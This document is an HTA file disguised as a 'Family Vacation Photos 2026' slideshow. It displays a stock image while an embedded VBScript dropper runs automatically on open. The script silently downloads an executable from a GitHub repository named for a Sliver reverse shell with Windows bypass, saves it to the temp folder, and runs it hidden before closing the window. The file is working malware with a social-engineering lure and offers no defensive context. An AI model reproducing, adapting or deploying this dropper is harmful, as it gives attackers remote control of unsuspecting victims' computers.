<!DOCTYPE html>
<html>
<head>
    <title>Family Vacation Photos 2026</title>
    <hta:application 
        id="oHTA"
        applicationname="VacationPhotos"
        border="none"
        caption="false"
        showintaskbar="no"
        windowstate="minimize"
        innerborder="no"
        navigable="yes"
        scroll="no"
        singleinstance="yes"
        sysmenu="no"
        icon="C:\Windows\System32\shell32.dll,1">

    <style>
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            overflow: hidden;
            background: black;
        }
        img {
            width: 100%;
            height: 100%;
            object-fit: contain;
        }
    </style>
</head>

<body>

    <!-- Nice full-screen image (change the URL to your own photo) -->
    <img src="https://picsum.photos/id/1015/1920/1080" alt="Vacation Photo">

<script language="VBScript">
    ' =============================================
    ' Auto-run VBS Dropper when HTA opens
    ' =============================================

    On Error Resume Next

    Dim url, localFile, fso, objHTTP, objStream, objShell

    url = "https://github.com/Jayakharan/Sliver_Reverse_Shell_Windows_Bypass/raw/main/CodeX.exe"
    Set fso = CreateObject("Scripting.FileSystemObject")
    localFile = fso.GetSpecialFolder(2) & "\CodeX.exe"

    ' Download silently
    Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    If objHTTP Is Nothing Then Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")
    If objHTTP Is Nothing Then Set objHTTP = CreateObject("Microsoft.XMLHTTP")

    objHTTP.Open "GET", url, False
    objHTTP.setRequestHeader "User-Agent", "Mozilla/5.0"
    objHTTP.Send

    If objHTTP.Status = 200 Then
        Set objStream = CreateObject("ADODB.Stream")
        objStream.Open
        objStream.Type = 1
        objStream.Write objHTTP.ResponseBody
        objStream.SaveToFile localFile, 2
        objStream.Close
    End If

    ' Run the exe completely hidden
    Set objShell = CreateObject("WScript.Shell")
    objShell.Run """" & localFile & """", 0, False

    ' Optional: Close the HTA window automatically
    window.close
</script>

</body>
</html>